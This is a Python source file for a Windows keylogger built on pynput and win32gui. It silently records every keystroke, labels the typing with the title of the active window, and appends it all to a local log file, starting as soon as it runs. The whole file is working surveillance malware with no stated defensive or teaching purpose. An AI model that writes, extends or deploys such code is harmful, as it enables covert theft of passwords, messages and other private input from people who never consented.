import os
import pynput
from pynput.keyboard import Key, Listener
from win32gui import GetForegroundWindow, GetWindowText

current_window = ""
keystowrite = []
keylogsfile = "klogs\\klogs.txt"
wrdcnts = 0
bspacepressed = False


def klog_on_press(key):
    global keys, wrdcnts, keystowrite
    keystowrite.append(key)
    wrdcnts += 1
    if wrdcnts >= 1:
        wrdcnts = 0
        klog_write_file(keystowrite)
        keystowrite = []

def klog_on_release(key):
    #if key == Key.esc:
        #return False
    pass

def klog_write_file(key_array):
    global current_window, bspacepressed
    with open(keylogsfile, "a") as f:
        for k in key_array:
            ke = str(k).replace("'","")
            if current_window != GetWindowText(GetForegroundWindow()):
                current_window = GetWindowText(GetForegroundWindow())
                f.write("\n\n################# %s #################\n\n" % str(current_window).upper())
                if ke.find("enter") > 0:
                    f.write('\n')
                if ke.find("backspace") > 0:
                    bspacepressed = True
                elif ke.find("space") > 0:
                    f.write(' ')
                if ke.find("Key") == -1:
                    f.write(ke)
            else:
                if ke.find("enter") > 0:
                    f.write('\n')
                if ke.find("backspace") > 0:
                    bspacepressed = True
                elif ke.find("space") > 0:
                    f.write(' ')
                if ke.find("Key") == -1:
                    f.write(ke)
    #print(ke)
    if bspacepressed == True:
        with open(keylogsfile, "rb+") as f:
            f.seek(-1, os.SEEK_END)
            f.truncate()
        bspacepressed = False


def klog_main():
    
    with Listener(on_press = klog_on_press, on_release = klog_on_release) as listner:
        listner.join()

klog_main()
